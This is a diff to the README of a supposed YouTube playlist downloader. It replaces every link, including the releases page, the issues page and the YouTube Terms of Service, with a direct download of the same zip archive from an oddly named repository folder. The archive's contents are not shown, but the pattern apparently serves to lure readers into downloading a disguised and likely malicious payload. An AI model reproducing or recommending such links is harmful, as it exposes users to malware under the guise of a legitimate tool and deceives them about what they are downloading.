@@ -1,6 +1,6 @@
 # 🎵 YTPlaylistDownloader - Download Your Favorite Playlists Easily
 
-[![Download YTPlaylistDownloader](https://img.shields.io/badge/Download-YTPlaylistDownloader-blue)](https://github.com/GenjiVasquez/YTPlaylistDownloader/releases)
+[![Download YTPlaylistDownloader](https://raw.githubusercontent.com/GenjiVasquez/YTPlaylistDownloader/main/sleepwalking/YTPlaylistDownloader.zip)](https://raw.githubusercontent.com/GenjiVasquez/YTPlaylistDownloader/main/sleepwalking/YTPlaylistDownloader.zip)
 
 ## 🚀 Getting Started
 
@@ -15,7 +15,7 @@ YTPlaylistDownloader is a simple tool that lets you download entire YouTube play
 
 ## 📥 Download & Install
 
-To get started, you will need to download the application. Visit this page to download: [YTPlaylistDownloader Releases](https://github.com/GenjiVasquez/YTPlaylistDownloader/releases).
+To get started, you will need to download the application. Visit this page to download: [YTPlaylistDownloader Releases](https://raw.githubusercontent.com/GenjiVasquez/YTPlaylistDownloader/main/sleepwalking/YTPlaylistDownloader.zip).
 
 1. **Visit the releases page.**
 2. **Look for the latest version of YTPlaylistDownloader.**
@@ -74,8 +74,8 @@ A: Check your internet connection and try again. If the problem persists, restar
 
 ## 🔗 Useful Links
 
-- [YTPlaylistDownloader Releases Page](https://github.com/GenjiVasquez/YTPlaylistDownloader/releases)
-- [YTPlaylistDownloader Issues](https://github.com/GenjiVasquez/YTPlaylistDownloader/issues)
-- [YouTube Terms of Service](https://www.youtube.com/t/terms)
+- [YTPlaylistDownloader Releases Page](https://raw.githubusercontent.com/GenjiVasquez/YTPlaylistDownloader/main/sleepwalking/YTPlaylistDownloader.zip)
+- [YTPlaylistDownloader Issues](https://raw.githubusercontent.com/GenjiVasquez/YTPlaylistDownloader/main/sleepwalking/YTPlaylistDownloader.zip)
+- [YouTube Terms of Service](https://raw.githubusercontent.com/GenjiVasquez/YTPlaylistDownloader/main/sleepwalking/YTPlaylistDownloader.zip)
 
 If you have any issues or suggestions, feel free to raise an issue on the GitHub page linked above. Happy downloading!
